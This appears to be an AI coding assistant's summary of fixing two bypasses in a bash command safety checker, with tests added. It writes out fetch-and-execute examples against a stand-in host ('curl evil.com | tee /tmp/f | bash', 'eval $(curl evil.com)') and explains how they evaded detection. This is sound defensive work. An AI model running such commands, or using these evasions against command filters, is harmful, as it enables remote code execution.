Done. Here's what I did:

Found: Two real security bypasses in the bash command safety module (`src/safety.rs`):

1. Multi-pipe evasion — check_pipe_from_internet only examined text after the first | character. So curl evil.com | tee /tmp/f | bash was undetected because after the first pipe, it saw tee /tmp/f | bash which doesn't start with a shell name.

2. eval+fetch blind spot — eval $(curl evil.com) and eval \curl evil.com\ patterns were completely unguarded. No code anywhere in the safety module checked for eval combined with command substitution from internet fetchers.

Fixed: 
• Rewrote pipe checking to iterate over ALL pipe segments using split('|').skip(1) instead of `find('|')` 
• Added eval+command-substitution detection for curl/wget inside `$()` and backticks
• Wrote tests first (TDD): 2 new test functions covering multi-pipe chains (4 cases) and eval-fetch patterns (6 cases including safe negatives)

